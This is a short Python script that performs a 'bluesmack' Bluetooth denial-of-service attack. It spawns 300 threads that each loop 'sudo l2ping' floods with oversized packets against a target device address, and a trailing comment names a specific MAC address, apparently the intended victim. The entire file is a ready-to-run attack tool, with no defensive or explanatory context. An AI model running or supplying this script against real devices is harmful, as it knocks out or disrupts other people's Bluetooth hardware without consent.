import os
import threading
import time
import sys
import requests

threads_count = 300
packages_size = 600
pkt_count = 1

def DOS(target, stopping_event, t_id):
    if (target == "nobody"):
        if (t_id % 10 == 0):
            print("Nobody to attack")
        return
     
    if (t_id % 10 == 0):
        print(f"Starting bluesmack attack {target}")
    while not stopping_event.is_set():
        os.system(f"sudo l2ping -i hci0 -s {str(packages_size)} -f {target}")
    
    if (t_id % 10 == 0):
        print(f"Done bluesmacking {target}")

def main(target_addr, stopping_event):
    time.sleep(0.1)
    threads = []

    try:
        for i in range(0, threads_count):
            t = threading.Thread(target=DOS, args=[str(target_addr), stopping_event, i])
            t.start()
            threads.append(t)
        while True:
            if stopping_event.is_set():
                for t in threads:
                    if t.is_alive():
                        t.join()
                return
            else:
                num_dead = 0
                for t in threads:
                    if not t.is_alive():
                        num_dead += 1
                        if num_dead >= threads_count:
                            return
                    
                    else:
                        break
                    
    except KeyboardInterrupt:
        stopping_event.set()
        for t in threads:
            if t.is_alive():
                t.join()



# 88:C6:26:F7:14:4B 